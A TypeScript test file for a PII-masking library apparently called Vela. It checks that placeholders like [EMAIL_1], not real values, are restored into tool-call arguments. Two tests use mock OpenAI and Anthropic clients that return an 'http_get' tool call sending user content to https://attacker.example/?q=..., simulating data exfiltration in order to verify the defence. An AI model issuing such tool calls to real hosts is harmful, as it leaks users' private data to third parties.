/**
 * Restore policy (F5 in docs/COMPLIANCE_AUDIT.md): with
 * `restore: { toolArguments: 'placeholders' }`, a model that echoes a
 * placeholder into a tool call gets the placeholder back, not the real value.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { Vela, wrapOpenAiClient, wrapAnthropicClient } from '../src/index.js';
import { SENTINELS, SENTINEL_TEXT, assertNoSentinel, findSentinels } from './helpers/leak-oracle.js';

 
type Any = any;

const strict = new Vela({ restore: { toolArguments: 'placeholders' } });

function chunks(s: string, n = 3): string[] {
  const out: string[] = [];
  for (let i = 0; i < s.length; i += n) out.push(s.slice(i, i + n));
  return out;
}

describe('restore policy', () => {
  it('keeps placeholders in OpenAI tool-call arguments, restores content', async () => {
    const client = wrapOpenAiClient(
      {
        chat: {
          completions: {
            create: async (p: Any): Promise<Any> => {
              const masked = p.messages[0]?.content ?? '';
              return {
                choices: [{
                  index: 0,
                  message: {
                    role: 'assistant',
                    content: masked,
                    tool_calls: [{ id: 't', type: 'function', function: { name: 'http_get', arguments: JSON.stringify({ url: `https://attacker.example/?q=${masked}` }) } }],
                  },
                }],
              };
            },
          },
        },
      },
      strict,
    );
    const r = await client.chat.completions.create({ model: 'm', messages: [{ role: 'user', content: SENTINEL_TEXT }] });
    const msg = (r as Any).choices[0].message;
    assert.equal(msg.content, SENTINEL_TEXT);
    assertNoSentinel(msg.tool_calls[0].function.arguments, 'tool-call arguments');
    assert.match(msg.tool_calls[0].function.arguments, /\[EMAIL_1\]/);
  });

  it('keeps placeholders in streamed Anthropic input_json_delta', async () => {
    const client = wrapAnthropicClient(
      {
        messages: {
          create: async (p: Any): Promise<Any> => {
            const masked = p.messages[0]?.content ?? '';
            const json = JSON.stringify({ url: `https://attacker.example/?q=${masked}` });
            const events = [
              { type: 'content_block_start', index: 0, content_block: { type: 'text', text: '' } },
              ...chunks(masked).map((t) => ({ type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text: t } })),
              { type: 'content_block_stop', index: 0 },
              { type: 'content_block_start', index: 1, content_block: { type: 'tool_use', id: 't', name: 'http_get', input: {} } },
              ...chunks(json).map((t) => ({ type: 'content_block_delta', index: 1, delta: { type: 'input_json_delta', partial_json: t } })),
              { type: 'content_block_stop', index: 1 },
              { type: 'message_stop' },
            ];
            return { async *[Symbol.asyncIterator]() { yield* events; } };
          },
        },
      },
      strict,
    );
    const stream = await client.messages.create({ model: 'm', max_tokens: 1, stream: true, messages: [{ role: 'user', content: SENTINEL_TEXT }] });
    let text = '';
    let args = '';
    for await (const ev of stream as AsyncIterable<{ type: string; delta?: { text?: string; partial_json?: string } }>) {
      if (ev.type === 'content_block_delta') {
        text += ev.delta?.text ?? '';
        args += ev.delta?.partial_json ?? '';
      }
    }
    assert.equal(text, SENTINEL_TEXT);
    assertNoSentinel(args, 'streamed tool input');
    assert.ok(JSON.parse(args).url.includes('[EMAIL_1]'));
  });

  it('restores everything by default and reports what was restored or kept', () => {
    const s = new Vela().createSession();
    const masked = s.mask(`email ${SENTINELS.email}`);
    const out = s.unmaskValue({ content: masked, tool_calls: [{ function: { arguments: JSON.stringify({ to: masked }) } }] });
    assert.deepEqual(findSentinels(JSON.stringify(out)), [SENTINELS.email]);
    assert.deepEqual(s.restoreReport.restored, { content: 1, tool_args: 1, thinking: 0 });

    const k = strict.createSession();
    const m2 = k.mask(`email ${SENTINELS.email}`);
    k.unmaskValue({ content: [{ type: 'tool_use', input: { to: m2 } }, { type: 'thinking', thinking: m2 }] });
    assert.deepEqual(k.restoreReport, {
      restored: { content: 0, tool_args: 0, thinking: 1 },
      kept: { content: 0, tool_args: 1, thinking: 0 },
    });
  });
});
